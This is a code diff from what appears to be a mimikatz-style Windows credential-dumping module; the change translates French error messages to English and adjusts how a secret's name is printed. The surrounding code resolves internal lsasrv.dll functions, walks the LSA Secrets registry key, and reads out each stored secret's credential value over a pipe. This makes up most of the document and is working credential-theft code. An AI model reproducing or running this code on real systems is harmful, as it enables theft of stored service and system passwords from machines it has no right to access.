@@ -30,7 +30,7 @@ bool searchSECFuncs()
 __kextdll bool __cdecl getSECFunctions(mod_pipe * monPipe, vector<wstring> * mesArguments)
 {
 	wostringstream monStream;
-	monStream << L"** lsasrv.dll ** ; Statut recherche : " << (searchSECFuncs() ? L"OK :)" : L"KO :(") << endl << endl <<
+	monStream << L"** lsasrv.dll ** ; Research status : " << (searchSECFuncs() ? L"OK :)" : L"KO :(") << endl << endl <<
 		L"@LsaIOpenPolicyTrusted = " << LsaIOpenPolicyTrusted << endl <<
 		L"@LsarOpenSecret        = " << LsarOpenSecret << endl <<
 		L"@LsarQuerySecret       = " << LsarQuerySecret << endl <<
@@ -62,7 +62,7 @@ __kextdll bool __cdecl getSecrets(mod_pipe * monPipe, vector<wstring> * mesArgum
 						if(RegEnumKeyEx(hKeysSecrets, i, monNomSecret.Buffer, &buffsize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
 						{
 							monNomSecret.Length = monNomSecret.MaximumLength = static_cast<USHORT>(buffsize * sizeof(wchar_t));
-							message.assign(L"\nSecret     : "); message.append(monNomSecret.Buffer, monNomSecret.Length / sizeof(wchar_t)); message.push_back(L'\n');
+							message.assign(L"\nSecret     : "); message.append(mod_text::stringOfSTRING(monNomSecret)); message.push_back(L'\n');
 							
 							LSA_HANDLE hSecret;
 							if(NT_SUCCESS(LsarOpenSecret(hPolicy, &monNomSecret, SECRET_QUERY_VALUE, &hSecret)))
@@ -73,22 +73,22 @@ __kextdll bool __cdecl getSecrets(mod_pipe * monPipe, vector<wstring> * mesArgum
 									message.append(L"Credential : "); message.append(mod_text::stringOrHex(reinterpret_cast<PBYTE>(monSecret->Buffer), monSecret->Length)); message.push_back(L'\n');
 									LsaFreeMemory(monSecret);
 								}
-								else message.append(L"Erreur : Impossible de récupérer le secret\n");
+								else message.append(L"Error : Unable to retrieve the secret\n");
 								LsarClose(&hSecret);
 							}
-							else message.append(L"Erreur : Impossible d\'ouvrir le secret\n");
+							else message.append(L"Error : Unable to open the secret\n");
 						}
 						delete[] monNomSecret.Buffer;
 						sendOk = sendTo(monPipe, message);
 					}
 					message.clear();
-				} else message.assign(L"Erreur : Impossible d\'obtenir des information sur le registre secret\n");
+				} else message.assign(L"Error :Unable to obtain information on the secret register\n");
 				RegCloseKey(hKeysSecrets);
 			}
-			else message.assign(L"Erreur : Impossible d\'ouvrir la clé Secrets\n");
+			else message.assign(L"Error : Unable to open Secrets key\n");
 			LsarClose(&hPolicy);
 		}
-		else message.assign(L"Erreur : Impossible d\'ouvrir la politique\n");
+		else message.assign(L"Error : Unable to open policy\n");
 		
 		if(!message.empty())
 			sendOk = sendTo(monPipe, message);
